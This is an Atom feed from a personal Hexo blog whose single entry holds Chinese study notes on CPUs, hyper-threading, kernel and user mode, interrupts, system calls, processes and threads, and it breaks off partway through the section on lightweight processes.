<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Baicai`Blog</title>
  
  <subtitle>你会发光吗？</subtitle>
  <link href="https://baicai.icu/atom.xml" rel="self"/>
  
  <link href="https://baicai.icu/"/>
  <updated>2022-12-06T06:50:47.673Z</updated>
  <id>https://baicai.icu/</id>
  
  <author>
    <name>Ethan</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World2</title>
    <link href="https://baicai.icu/posts/98975d7d%EF%BC%9F.html"/>
    <id>https://baicai.icu/posts/98975d7d%EF%BC%9F.html</id>
    <published>2022-12-06T06:50:47.673Z</published>
    <updated>2022-12-06T06:50:47.673Z</updated>
    
    <content type="html"><![CDATA[<h1 id="？？问题"><a href="#？？问题" class="headerlink" title="？？问题"></a>？？问题</h1><ul><li>一个六核十二线程为什么可以执行以一个300个线程的软件<ul><li>首先6核只有6线程，但是通过超线程实现了12线程</li><li>其次，300线程的软件，300起了300条指令，最后11执行的还是只有12条通道，可以理解为300线程是300辆车，12是12条车道</li><li>车载的是数据和资源，即线程在搬运数据和资源</li><li>车运行的过程就是指令执行的过程</li><li>执行指令的通道就12条</li><li>然后就是300线程是通过线程库产生的，那么问题由来了<ul><li>这300个线程是运行在一个物理核心上的，那么不会慢吗，有其他解决办法吗</li></ul></li><li>因为300是用户线程，用户知道系统不知道，12线程是内核级，操心系统知道</li></ul></li><li>CPU，一个独立的运算单元，同时只能运行一个进程吗<ul><li>应该是，因为一个物理核心同时最多运行一个线程，而线程属于进程的一部分</li></ul></li><li>那一个物理CPU可以同时运行一个进程吗<ul><li>是可以的，因为一个进程的多个线程可以分配不同的物理核心</li></ul></li></ul><p>CPU核心只能看到线程和操作系统眼里还是只有这一个进程。分开</p><ul><li>操作系统眼里还是只有这一个进程。<ul><li>操作系统：谁知道你的线程是属于哪个进程的，在这里，我就知道我要执行哪个进程（比如我打开某个电脑软件），以至于它怎么打开的（执行了多少线程），我不知道</li></ul></li></ul><p>那我用线程库写的一个多线程进程，</p><ul><li>即打开tomcat，就申请了300个线程</li></ul><p>那我用线程库写的一个多线程进程，多个线程也就都只能在一个CPU核心上运行</p><ul><li>用户级线程，这个就没办法跑到多个核上了</li></ul><p>，只能等待A主动放弃CPU。</p><ul><li>比如a执行完毕了</li></ul><p>用java做比分，java线程就是一个用户线程对应一个内核线程，而多个用户线程对应一个内核线程则是指更轻量级的线程，即多用户线程不用经过内核态进行切换，可以理解为是协程</p><p>再提一下，如果是多核的cpu，只有内核态的线程才能利用多核，用户态线程不行，所以需要将用户线程与内核线程映射，多个用户线程对应一个内核线程从本质来说其实只会用一个核</p><ul><li>跟知乎问对上了</li></ul><h2 id="0各种概念"><a href="#0各种概念" class="headerlink" title="0各种概念"></a>0各种概念</h2><h3 id="处理机（processor）"><a href="#处理机（processor）" class="headerlink" title="处理机（processor）"></a>处理机（<em>processor</em>）</h3><ul><li>处理机包括中央处理器，主存储器，输入-输出接口，加接外围设备就构成完整的计算机系统。</li></ul><h3 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h3><ul><li>如果一个计算机有6个核心，只运行了6个线程，即线程数不大于物理核心数，那么就不需要分时处理，是真正的同时执行。现在计算机在启动时，已经执行了很多进程，线程数量更多，所以需要分时切片来执行</li></ul><h3 id="调度"><a href="#调度" class="headerlink" title="调度"></a>调度</h3><h3 id="上下文"><a href="#上下文" class="headerlink" title="上下文"></a>上下文</h3><h1 id="计算机硬件部分知识"><a href="#计算机硬件部分知识" class="headerlink" title="计算机硬件部分知识"></a>计算机硬件部分知识</h1><h2 id="🚩物理CPU"><a href="#🚩物理CPU" class="headerlink" title="🚩物理CPU"></a>🚩物理CPU</h2><p>一般指的是计算机的中央处理器 ，普通电脑一般只有一个CPU插槽，即只有一个物理CPU。</p><p><strong>广义上的CPU</strong>：在日常生活中，CPU一般指的是封装好的物理CPU，例如英特尔的<code>酷睿</code>系列和AMD的<code>锐龙</code>系列。</p><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/amd.jpg" alt="amd" style="zoom: 25%;" align="left" /></p><p><strong>狭义上的CPU</strong>：在编程的讨论情况下，CPU通常指的是一个运算单元，即下面的说的【<em>core</em>物理核心】。</p><h2 id="🚩物理核心（core）"><a href="#🚩物理核心（core）" class="headerlink" title="🚩物理核心（core）"></a>🚩物理核心（core）</h2><p>在编程的讨论范围下，一般CPU指的是一个物理CPU中的一个核心。例如8核，即一个CPU有8个核心，拥有8个独立的运算单元。</p><p>一般来说，一个物理核心就是一个独立的运算单元，一个物理核心同时最多运行一个线程。一个运算单元有一套寄存器，一般还有L1，L2的私有缓存等等。</p><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/运算单元.jpg" alt="运算单元" style="zoom:100%;"  align="left" /></p><h2 id="🚩逻辑核心（logic-core）"><a href="#🚩逻辑核心（logic-core）" class="headerlink" title="🚩逻辑核心（logic core）"></a>🚩逻辑核心（logic core）</h2><p>由于英特尔的超线程技术，可以实现一个核心同时执行多个线程，则产生了逻辑核心的说法，也就是说，平日里我们说的8核16线程，一个物理核心硬件级模拟运行了二个线程，按照一个线程对应一个核心的说法，此处的逻辑核心为16。</p><p>为什么 Intel 的超线程技术是一个核两条线程，而不是更多？</p><ul><li>因为这是平衡了性能、晶体管效率、实现难度等等综合考虑的结果，事实还也有单核4线程的CPU，比如<code>intel Xeon Phi</code>。</li></ul><h2 id="🚩超线程（Hyper-Threading）"><a href="#🚩超线程（Hyper-Threading）" class="headerlink" title="🚩超线程（Hyper-Threading）"></a>🚩超线程（Hyper-Threading）</h2><h3 id="⭐什么是超线程？"><a href="#⭐什么是超线程？" class="headerlink" title="⭐什么是超线程？"></a>⭐什么是超线程？</h3><p>超线程是英特尔开发出来的一项技术，使得单个CPU可以像两个逻辑CPU那样运行。</p><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/超线程.jpg" alt="超线程" style="zoom: 50%;"  align="left" /></p><h3 id="⭐超线程技术实现并行操作的原理？"><a href="#⭐超线程技术实现并行操作的原理？" class="headerlink" title="⭐超线程技术实现并行操作的原理？"></a>⭐超线程技术实现并行操作的原理？</h3><p>问题：一个线程在执行时会占用CPU资源，其他线程想要得到执行就必须等待该线程将CPU资源让出，但是需要注意的是，此时占用CPU的线程<strong>可能并不是完全地利用CPU所有的资源</strong>，这造成了资源的浪费。</p><p>解决：超线程技术允许两个线程<strong>同时不冲突</strong>地使用CPU中的资源。</p><ul><li>比如一条整数运算指令只会用到整数运算单元，此时浮点运算单元就空闲了，若使用了超线程技术，且另一个线程刚好此时要执行一个浮点运算指令，CPU就允许属于两个不同线程的整数运算指令和浮点运算指令同时执行，所以这两个线程共享同一个CPU资源。</li><li>超线程技术，只是模拟出的两个逻辑内核来共享同一个CPU资源，但这也并不意味着两个线程在同一个CPU中一直都可以并行执行，只有两个线程在不使用相同的CPU资源的情况下，才可以真正地并行执行。</li><li>简单点来说，就是假设CPU拥有ABCD资源，线程1需要A资源，线程2需要B资源，此次两个线程就能并行执行在这个CPU上。</li><li>以上的CPU，是指物理CPU中的一个核心<em>（core）</em>。</li></ul><h2 id="🚩指令集架构（ISA）"><a href="#🚩指令集架构（ISA）" class="headerlink" title="🚩指令集架构（ISA）"></a>🚩指令集架构（ISA）</h2><p>在计算机发展中，出现了很多指令集架构，目前比较主流有如下2个架构：</p><p><strong>复杂指令集运算（Complex Instruction Set Computing，CISC）</strong></p><ul><li>CISC处理器架构家族最出名的架构，就是x86架构。</li><li><p>市场上常见的Intel和AMD处理器大多数都属于x86架构。</p></li><li><p>目前支持x86处理器操作系统有，微软的Windows和苹果公司的macOS。另外Linux，一些UNIX等，都可以运行在x86架构的处理器。</p></li></ul><p><strong>精简指令集运算（Reduced Instruction Set Computing，RISC）</strong></p><ul><li>RISC处理器架构家族最出名的架构，就是ARM架构。</li><li>常见的ARM架构处理器，有Apple的<code>M1处理器</code>、高通的<code>骁龙处理器</code>和华为的<code>麒麟处理器</code>等。</li><li>目前有UNIX、Linux以及包括iOS、Android、Windows Phone等在内的大多数移动操作系统运行在ARM处理器上。</li></ul><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/指令系统的演变.png" alt="指令系统的演变" style="zoom: 50%;" align="left" /></p><h1 id="计算机操作系统"><a href="#计算机操作系统" class="headerlink" title="计算机操作系统"></a>计算机操作系统</h1><h2 id="🚩指令（Instruction）"><a href="#🚩指令（Instruction）" class="headerlink" title="🚩指令（Instruction）"></a>🚩指令（Instruction）</h2><p>指令是由指令集架构定义的单个的CPU操作，即CPU能识别、执行的最基本命令，比如四则运算、寄存器读写等。简单来说，指令就是通过硬件刻录进物理CPU内的一个最基础功能点，而指令集就是物理CPU的操作说明书，通过不同的指令组合就能实现不同的复杂功能。</p><p><strong>在操作系统中，根据指令的权限等级，分为特权指令和非特权指令。很明显，执行特权指令需要高权限，如果某个用户使用了一个比如内存清零的特权指令，就能将其他用户的内存数据清零，这样显然是危险的，所以用户级程序是不能使用特权指令的。</strong></p><blockquote><p>特权指令：如内存清零指令<br>非特权指令：如普通的运行指令</p></blockquote><h4 id="📗CPU的状态"><a href="#📗CPU的状态" class="headerlink" title="📗CPU的状态"></a>📗CPU的状态</h4><ul><li><em>CPU是如何界定特权指令的使用标准的呢？</em></li></ul><blockquote><p>将CPU运行指令的状态来划分为2种，用户态和核心态（也叫内核态）。</p><p>用户态（user mode）：CPU只能执行非特权指令。<br>核心态（kernel mode）：CPU既可以执行特权指令，也可以执行非特权指令。</p></blockquote><h4 id="📗程序的种类"><a href="#📗程序的种类" class="headerlink" title="📗程序的种类"></a>📗程序的种类</h4><ul><li><em>如何规定哪些程序可以使用特权指令呢？</em></li></ul><blockquote><p>将CPU运行程序的状态来划分为2种，内核程序和应用程序。</p><p>用户程序：运行在用户态，只能执行非特权指令。<br>内核程序：运行在核心态，既可以执行特权指令，也可以执行非特权指令。</p></blockquote><h2 id="🚩内核（kernel）"><a href="#🚩内核（kernel）" class="headerlink" title="🚩内核（kernel）"></a>🚩内核（kernel）</h2><h3 id="⭐什么是内核？"><a href="#⭐什么是内核？" class="headerlink" title="⭐什么是内核？"></a>⭐什么是内核？</h3><p>简单来说，<strong>「内核就是操作系统中的一组程序模块」</strong>，它负责管理系统的进程、内存、设备驱动程序、文件和网络系统等等，决定着系统的性能和稳定性，是连接应用程序和硬件的桥梁。</p><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/计算机系统的层次结构.jpg" alt="计算机系统的层次结构"></p><h3 id="⭐内核态和用户态"><a href="#⭐内核态和用户态" class="headerlink" title="⭐内核态和用户态"></a>⭐内核态和用户态</h3><p>由于内核可以使用特权指令，所以内核程序（也称为系统程序）作为资源的调度者，决定一个用户程序在什么时候对某部分硬件操作多长时间。</p><p>从内核调度资源的视角再一次阐述CPU的状态</p><ul><li><strong>「内核态」</strong>（kernel mode）：当 CPU 处于内核态时，这是操作系统管理程序（也就是内核）运行时所处的状态。运行在内核态的程序可以访问计算机的任何资源，不受限制，为所欲为，例如协调 CPU 资源，分配内存资源，提供稳定的环境供应用程序运行等。</li><li><strong>「用户态」</strong>（user mode）：应用程序基本都是运行在用户态的，或者说用户态就是提供应用程序运行的空间。运行在用户态的程序只能访问当前 CPU 上执行程序所在的地址空间，这样有效地防止了操作系统程序受到应用程序的侵害。</li></ul><h2 id="🚩中断机制（Interrupt）"><a href="#🚩中断机制（Interrupt）" class="headerlink" title="🚩中断机制（Interrupt）"></a>🚩中断机制（Interrupt）</h2><h3 id="⭐什么是中断？"><a href="#⭐什么是中断？" class="headerlink" title="⭐什么是中断？"></a>⭐什么是中断？</h3><p>在合适的情况下，操作系统的内核会把 CPU 的使用权主动让给应用程序，也就是使 CPU 从内核态转换到用户态。而 CPU 要想从用户态回到内核态，只能通过中断机制完成，如果没有中断机制，那么一旦应用程序上 CPU 运行（用户态），CPU 就会一直运行这个应用程序。也就是说，<strong>「中断是让操作系统内核夺回 CPU 使用权的唯一途径」</strong>。可以说，<strong>「操作系统是由中断驱动的」</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[内核态] --&gt;|执行某一个特权指令,该指令会修改程序状态标识,从而转成用户态|B(用户态)</span><br><span class="line">B[用户态] --&gt;|只能通过中断|A(内核态)</span><br></pre></td></tr></table></figure><h3 id="⭐中断的分类"><a href="#⭐中断的分类" class="headerlink" title="⭐中断的分类"></a>⭐中断的分类</h3><p>按照中断信号来源于CPU 的外部还是内部，将中断类型分为外中断和内中断：</p><ul><li><strong>「外中断」（也称中断，狭义上的中断）</strong> <ul><li>外中断与当前执行的指令无关，中断信号来源于 CPU 外部。如 I/O 完成中断，表示设备输入/输出处理已经完成，CPU 能够发送下一个输入/输出请求。此外还有时钟中断、控制台中断等。</li></ul></li><li><strong>「内中断」（也称 异常、例外）</strong><ul><li>内中断与当前执行的指令有关，中断信号来源于 CPU 内部。如非法操作码、地址越界、算术溢出，除数为 0 等。</li></ul></li></ul><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/中断的分类.jpg" alt="中断的分类"></p><h3 id="⭐程序是如何被中断的"><a href="#⭐程序是如何被中断的" class="headerlink" title="⭐程序是如何被中断的"></a>⭐程序是如何被中断的</h3><ul><li>1）程序请求操作系统服务，执行<code>系统调用</code>（执行系统调用也是发生了一次内中断）</li><li>2）程序运行时产生外中断事件（比如 I/O 操作完成），运行程序被中断，转向中断程序处理</li><li>3）在程序运行时发生内中断（异常）事件，运行程序被打断，转向异常处理程序工作</li></ul><h2 id="🚩系统调用（system-call）"><a href="#🚩系统调用（system-call）" class="headerlink" title="🚩系统调用（system call）"></a>🚩系统调用（system call）</h2><h3 id="⭐什么是系统调用"><a href="#⭐什么是系统调用" class="headerlink" title="⭐什么是系统调用"></a>⭐什么是系统调用</h3><p>抽象点来说，指运行在<code>用户空间（User space）</code>的程序向操作系统内核请求需要更高权限运行的服务。</p><blockquote><p>在操作系统中，虚拟内存通常会被分成用户空间（又称使用者空间），与核心空间（Kernel space）这两个区块。</p><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/系统调用-linux空间详细.jpg" alt="系统调用-linux空间详细" style="zoom: 80%;" /></p></blockquote><p>详细点来说，操作系统作为用户和计算机硬件之间的接口，需要向上提供一些简单易用的服务，这个上层分为<code>用户</code>和<code>应用程序</code>。</p><ul><li><p>给用户提供的接口有图形界面 GUI 和命令接口，给应用程序提供的是<strong>「程序接口」</strong>，这个<strong>「程序接口」</strong>就是由一组<strong>系统调用</strong>组成的，是操作系统提供给开发人员使用的。</p></li><li><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/系统调用提供的接口.png" alt="系统调用提供的接口"></p></li></ul><h3 id="⭐操作系统为什么要提供“系统调用”功能？"><a href="#⭐操作系统为什么要提供“系统调用”功能？" class="headerlink" title="⭐操作系统为什么要提供“系统调用”功能？"></a>⭐操作系统为什么要提供“系统调用”功能？</h3><blockquote><p>举个例子：我们去学校打印店打印论文，你按下了 WPS 的 “打印” 选项，于是打印机开始工作。 你的论文打印到一半时，另一位同学按下了 Word 的 “打印” 按钮，开始打印他自己的论文。想象一下如果两个进程可以随意的、并发的共享打印机资源，会发生什么情况？</p><p>显然，两个进程并发运行，导致打印机设备交替的收到 WPS 和 Word 两个进程发来的打印请求，结果两篇论文的内容混杂在一起了。</p><p>如何解决这个问题？操作系统提供“系统调用”功能，用户进程想要使用打印机这种共享的资源，只能通过系统调用向操作系统内核发出请求，内核会对各个请求进行协调处理（进程调度），所以说内核才是操作系统的管理者。</p></blockquote><p>系统调用的设计就是为了预防用户非法操作以及用户程序恶意使用资源，从而确保操作系统自身能够稳定、高效、安全运行。</p><p>系统调用按功能大致可分为如下几类：</p><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/系统调用按功能分类.png" alt="系统调用按功能分类"></p><h3 id="⭐系统调用和库函数的区别"><a href="#⭐系统调用和库函数的区别" class="headerlink" title="⭐系统调用和库函数的区别"></a>⭐系统调用和库函数的区别</h3><ul><li><p>用户程序其实是可以直接使用汇编语言的方式来调用计算机的<code>系统调用</code>功能，但是计算机发展到了现在，应用程序的开发语言几乎都是高级语言，高级语言通过<code>库函数</code>封装了<code>系统调用</code>给程序的接口，开发者只需要调用库函数就能完成对资源的调用。</p></li><li><p>需要注意的是，不是所有的库函数都涉及系统的调用，比如下面两个例子</p><ul><li><font color="#ef7050">**「不涉及系统调用的库函数，比如取绝对值」**</font></li><li><font color="#ef7050">**「涉及系统调用的库函数，比如创建一个文件」**</font></li><li><img src="http://pic.baicai.icu/cpu和线程的问题.assets/系统调用和库函数.png" alt="系统调用和库函数"></li></ul></li></ul><h3 id="⭐系统调用背后的过程"><a href="#⭐系统调用背后的过程" class="headerlink" title="⭐系统调用背后的过程"></a>⭐系统调用背后的过程</h3><ul><li><p>编译器将高级语言的代码编译成汇编指令后，CPU就能识别该汇编指令。下面举一个例子：向一个文件写入数据。</p><ul><li><p>高级语言的代码中使用了write库函数，编译器就会识别出该行为属于系统调用，就会在汇编指令中添加<code>陷入指令（int x）</code>，<code>陷入指令</code>的作用是将CPU的控制权交还给操作系统，由操作系统完成由后续相对应的文件写入操作（写入用户程序提供的abc参数）。</p><blockquote><p>参数abc也需要使用movl指令写入到寄存器。</p><p>int x的int指的是CPU发生内中断的一系列陷入指令，x指的是从这一系列指令某一个。拿Linux来说，int 2就是让操作系统为我们创建一个进程，int 4就是进行一个写入操作。</p></blockquote></li><li><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/系统调用背后的过程.jpg" alt="系统调用背后的过程"></p></li></ul></li></ul><h2 id="🚩进程（process）"><a href="#🚩进程（process）" class="headerlink" title="🚩进程（process）"></a>🚩进程（process）</h2><h3 id="⭐什么是进程？"><a href="#⭐什么是进程？" class="headerlink" title="⭐什么是进程？"></a>⭐什么是进程？</h3><ul><li>进程是一种抽象的概念，所以进程在<strong>不同的角度</strong>下，有不同的定义，比较常见的描述有如下<ul><li><em>进程是程序的一次执行过程</em></li><li><em>进程是操作系统分配资源的最小单位，此处的资源包括不限于：CPU『指core核心』、内存、磁盘等</em></li><li><em>进程是线程的容器</em></li><li><em>进程有时候也被称为<strong>作业</strong>（job）和<strong>任务</strong>（task）</em></li></ul></li><li>为什么出现进程这种概念？<ul><li>由于硬件的发展，一个程序可以在计算机中运行多个实例（如打开2个QQ），多个实例在内存中怎么来表示呢？所以引出了进程的概念。</li><li>为了能更好地描述程序在计算机运行的过程。</li></ul></li><li>比如window操作系统中<code>任务管理器</code>就能看到所有的进程<ul><li><img src="http://pic.baicai.icu/cpu和线程的问题.assets/window任务管理器中的进程.png" alt="window任务管理器中的进程"></li></ul></li></ul><h3 id="⭐组成"><a href="#⭐组成" class="headerlink" title="⭐组成"></a>⭐组成</h3><ul><li>进程由程序、数据和进程控制块（PCB）三部分组成。</li></ul><h3 id="⭐特征"><a href="#⭐特征" class="headerlink" title="⭐特征"></a>⭐特征</h3><ul><li><strong>动态性</strong>：可动态地创建、结束进程</li><li><strong>并发性</strong>：任何进程都可以同其他进程一起<strong>并发执行</strong></li><li><strong>独立性</strong>：进程是能独立运行、独立获得资源、独立接受调度的基本单位</li><li><strong>异步性</strong>：由于进程间的相互制约，使进程具有执行的间断性，即进程按各自独立的、不可预知的速度向前推进</li></ul><h3 id="⭐生命周期"><a href="#⭐生命周期" class="headerlink" title="⭐生命周期"></a>⭐生命周期</h3><ul><li><strong>创建（<em>new</em>）</strong><ul><li>进程正在被创建，操作系统为进程分配资源、初始化PCB。</li></ul></li><li><strong>运行（<em>running</em>）</strong><ul><li>一个进程正在处理机运行时。</li><li>单核处理机环境下，每个时刻最多只有一个进程处于运行态。</li><li>双核环境下，可以同时有两个进程处于运行态。</li></ul></li><li><strong>等待（<em>waiting</em>）</strong><ul><li>又称为称“阻塞状态”（<em>blocked</em>）。</li><li>一个进程正在等待某一时间而暂停运行时。如等待某资源，等待输入 <em>/</em> 输出完成、</li></ul></li><li><strong>就绪（<em>ready</em>）</strong><ul><li>一个进程获得了除了处理机之外的一切所需资源，一旦得到处理机即可运行。</li></ul></li><li><strong>结束（<em>terminated</em>）</strong><ul><li>进程正在从系统中撤销，操作系统回收进程拥有的资源、撤销PCB</li></ul></li><li><img src="http://pic.baicai.icu/cpu和线程的问题.assets/进程的状态切换.png" alt="进程的状态切换" style="zoom:50%;" /></li></ul><h2 id="🚩线程（thread）"><a href="#🚩线程（thread）" class="headerlink" title="🚩线程（thread）"></a>🚩线程（thread）</h2><h3 id="⭐什么是线程？"><a href="#⭐什么是线程？" class="headerlink" title="⭐什么是线程？"></a>⭐什么是线程？</h3><ul><li>线程是也是一种抽象的概念，所以线程在<strong>不同的角度</strong>下，有不同的描述。<ul><li>指令视角<ul><li>在计算机科学中，一条线程是最小的<strong><font color="#ef7050">程序指令序列</font></strong>。</li></ul></li><li>操作系统视角<ul><li>线程是<strong><font color="#ef7050">操作系统</font></strong>能够进行运算<strong><font color="#ef7050">调度</font></strong>的最小单位，它被包含在进程之中，是进程中的实际运作单位。</li></ul></li><li>系统资源视角<ul><li><strong><font color="#ef7050">进程</font></strong>只作为<strong><font color="#ef7050">除了CPU以外的其他系统资源的分配单元</font></strong>（如打印机、内存地址都是分配给进程的），即<strong><font color="#ef7050">线程</font></strong>负责实际执行任务，进程负责申请资源。</li></ul></li><li>调度视角<ul><li>线程由操作系统的<strong><font color="#ef7050">调度程序</font></strong>独立管理。</li></ul></li></ul></li><li>于是就有了<font color="#ef7050"><strong>「CPU核心（core）只能看到线程」</strong></font>和<font color="#ef7050"><strong>「操作系统眼里只有进程」</strong></font>这一说法，即core负责执行程序指令序列，而操作系统负责管理CPU的同时还负责系统资源的调度。</li></ul><h3 id="⭐为什么出现线程？"><a href="#⭐为什么出现线程？" class="headerlink" title="⭐为什么出现线程？"></a>⭐为什么出现线程？</h3><ul><li><p>由于程序是以进程的方式出现在操作系统中，然而一个进程可能包含了很多功能模块，举一个例子：MP3播放软件。</p><ul><li>一个MP3播放软件核心功能模块有3个<ul><li>从MP3音频文件当中读取数据</li><li>对数据进行解压</li><li>把解压后的音频数据播放出来</li></ul></li></ul></li><li><p>在没有线程的情况下，当第一步read文件操作时阻塞了，由于是一个执行流程，然后其剩下2个模块自然也会阻塞。那我们进一步优化该软件，可以把这个播放软件拆分成3个进程，第一步read文件操作优先执行一段时间，来当做<strong>缓冲数据</strong>。结合3者交替执行，就能形成一边播放音乐一边解压和读取音频数据。但是进程创建、消亡、通讯等等都会消耗大量资源，为了节省资源于是就有了线程这个概念。总的来说，线程的出现就是为了<strong><font color="#ef7050">「把进程作为资源分配单位和调度单位这两个属性分开处理」</font></strong>。</p></li></ul><h3 id="⭐线程的特征"><a href="#⭐线程的特征" class="headerlink" title="⭐线程的特征"></a>⭐线程的特征</h3><ul><li><p>各个线程之间可以并发执行。</p></li><li><p>线程具有就绪、阻塞、运行三种基本状态，同样具有状态之间的转换关系。</p></li><li>在支持多核的操作系统中，一个进程的各个线程可以分派到不同的核心（core）上执行任务。</li></ul><h3 id="⭐线程的优缺点"><a href="#⭐线程的优缺点" class="headerlink" title="⭐线程的优缺点"></a>⭐线程的优缺点</h3><h4 id="📗优点"><a href="#📗优点" class="headerlink" title="📗优点"></a>📗优点</h4><ul><li><p>线程能减少并发执行的时间和空间开支，即开销更小，比如：</p><ul><li><p>线程创建的时间比进程短。</p></li><li><p>线程终止的时间比进程短。</p></li><li><p>同一进程内的线程切换时间比进程短。</p></li><li>由于同一进程的各个线程共享内容和文件资源，可直接进行不通过内核进行通信</li></ul></li></ul><ul><li>总的来说，进程操作需要执行的步骤，线程只会更少。</li></ul><h4 id="📗缺点"><a href="#📗缺点" class="headerlink" title="📗缺点"></a>📗缺点</h4><ul><li>一个线程崩溃，可能会导致其属所属进程的所有线程崩溃，因为其他线程可能也需要该资源。</li></ul><h4 id="📗何时用进程，何时用线程"><a href="#📗何时用进程，何时用线程" class="headerlink" title="📗何时用进程，何时用线程"></a>📗何时用进程，何时用线程</h4><ul><li>线程特点，高性能，数据容易不安全</li><li>进程特点，相对低性能，数据隔离，安全</li></ul><h3 id="⭐线程库（Thread-library）"><a href="#⭐线程库（Thread-library）" class="headerlink" title="⭐线程库（Thread library）"></a>⭐线程库（Thread library）</h3><ul><li><p>线程库是操作系统提供开发人员管理线程的一套 API。线程库不仅可以在用户空间中实现，还可以在内核空间中实现。</p></li><li><p>线程库的出现为了解决<code>用户级线程</code>与<code>内核级线程</code>的某种映射关系。</p><blockquote><p>线程库有时候也叫线程包。</p><p>在用户空间实现的线程库，没有内核支持。</p><p>在内核空间实现的线程库，会导致对内核的<strong>系统调用</strong>。</p></blockquote></li><li><p>简单介绍下三个主要的线程库</p><p> <a href="https://zh.wikipedia.org/wiki/POSIX%E7%BA%BF%E7%A8%8B">POSIX线程</a>：<a href="https://zh.wikipedia.org/wiki/%E5%8F%AF%E7%A7%BB%E6%A4%8D%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3">POSIX</a> 标准的拓展，可以提供用户级和内核级的库。</p><blockquote><p>POSIX，Portable Operating System Interface of UNIX的缩写，中文释义为<code>可移植操作系统接口</code>，是IEEE为要在各种UNIX操作系统上运行软件，而定义API的一系列互相关联标准的总称。总的来说，POSIX就是一个标准化规范接口，所以<strong>POSIX线程仅仅是线程行为规范，而不是实现</strong>。</p><p>实现POSIX线程标准的库常也被称作<strong>pthreads</strong>，如Linux、Mac OS、Solaris 等 OS 都实现了这个规范，但是Microsoft Windows也实现一部分标准。</p></blockquote></li></ul><ol><li><p>Win32线程：适用于 Windows OS 的内核级线程库</p></li><li><p>UNIX International线程：<a href="https://zh.wikipedia.org/wiki/Solaris">SUN Solaris操作系统</a>使用的线程，支持内核线程、轻权进程和用户线程。</p></li></ol><h3 id="⭐线程的实现方式"><a href="#⭐线程的实现方式" class="headerlink" title="⭐线程的实现方式"></a>⭐线程的实现方式</h3><h4 id="📗用户级线程（User-Level-Threads-ULT）"><a href="#📗用户级线程（User-Level-Threads-ULT）" class="headerlink" title="📗用户级线程（User-Level Threads ULT）"></a>📗用户级线程（User-Level Threads ULT）</h4><ul><li><p>用户级<strong><font color="#ef7050">线程包</font></strong></p><ul><li><img src="http://pic.baicai.icu/cpu和线程的问题.assets/用户级线程.jpg" alt="用户级线程"></li></ul></li><li><p>描述：用户级线程是一种在<strong><font color="#ef7050">用户空间</font></strong>实现的<strong><font color="#ef7050">线程机制</font></strong>，它不依赖于<strong><font color="#ef7050">操作系统的内核</font></strong>，由一组用户级的<strong><font color="#ef7050">线程库函数</font></strong>来完成线程的<strong><font color="#ef7050">管理</font></strong></p></li><li><p>优点</p><ul><li><p>线程位于用户空间，即线程的切换在用户态就能完成切换，无需切换CPU的状态。</p></li><li><p>完全控制线程调度器，即允许该进程的线程拥有自定义的线程调度算法。</p></li><li><p>独立于操作系统的内核，即可用于不支持线程技术的多进程操作系统。</p></li><li><p>运行时系统(runtime system)可以切换用户空间中的本地阻塞线程（例如:等待另一个线程完成)。</p><blockquote><p><a href="https://en.wikipedia.org/wiki/Runtime_system">运行时系统</a>，指的是某门语言的宿主环境，比如 Java 的运行时是 JRE。</p></blockquote></li></ul></li><li><p>缺点</p><ul><li><p>当一个线程因发起系统调用而阻塞，将会阻塞整个进程。</p></li><li><p>当一个线程开始运行时，除非它主动交出CPU使用权，否则它所属进程的其他线程无法执行。</p><blockquote><p>用户空间的线程库一直执行在用户态，所以无法主动打断当前线程的执行，但是操作系统有中断机制，可以夺回CPU的控制权来切换当前线程。</p></blockquote></li><li><p>非真正意义的线程并行。</p><blockquote><p>由于内核无法感知用户级线程，所以内核认为该线程所属进程只有一个线程，因此该进程只会分配到单个CPU上。</p></blockquote></li><li><p>由于时间片是分配给进程，故与其他进程相比，在多线程执行时，每个线程得到的时间片较少，执行会较慢。</p></li></ul></li></ul><h4 id="📗内核级线程（Kernel-Level-Threads-KLT）"><a href="#📗内核级线程（Kernel-Level-Threads-KLT）" class="headerlink" title="📗内核级线程（Kernel-Level Threads, KLT）"></a>📗内核级线程（Kernel-Level Threads, KLT）</h4><ul><li><p>由内核管理的<strong><font color="#ef7050">线程包</font></strong></p><ul><li><img src="http://pic.baicai.icu/cpu和线程的问题.assets/内核线程.jpg" alt="内核线程"></li></ul></li><li><p>描述：内核级线程是一种在<strong><font color="#ef7050">内核</font></strong>实现的<strong><font color="#ef7050">线程机制</font></strong>，由<strong><font color="#ef7050">操作系统的内核</font></strong>来完成线程的<strong><font color="#ef7050">管理</font></strong></p></li><li><p>优点</p><ul><li><p>实现了真正意义上的线程并行</p><blockquote><p>内核可以感知到内核级线程，因此操作系统可以将进程的不同线程分配给不同的CPU，并行完成任务。</p></blockquote></li><li><p>一个进程当中，某个内核级线程因发起系统调用而阻塞，并不会影响其他内核级线程的运行。</p></li><li><p>不需要运行时系统(runtime system)的参与。</p></li></ul></li><li><p>缺点</p><ul><li><p>频繁的切换CPU状态增加系统的开销。</p><blockquote><p>内核级线程的管理，都是通过系统调用/内核函数的方式进行的，即需要CPU「<strong>陷入</strong>」内核态，因此相较于用户级线程会有系统开销的增加。</p></blockquote></li></ul></li></ul><h4 id="📗轻量级进程（Light-Weight-Process）"><a href="#📗轻量级进程（Light-Weight-Process）" class="headerlink" title="📗轻量级进程（Light Weight Process）"></a>📗轻量级进程（Light Weight Process）</h4><ul><li><p>描述：内核支持的用户线程。一个进程可有一个或多个轻量级进程，每个轻权进程由一个单独的内核级线程来支持。(Linux / Solaris)</p><ul><li><img 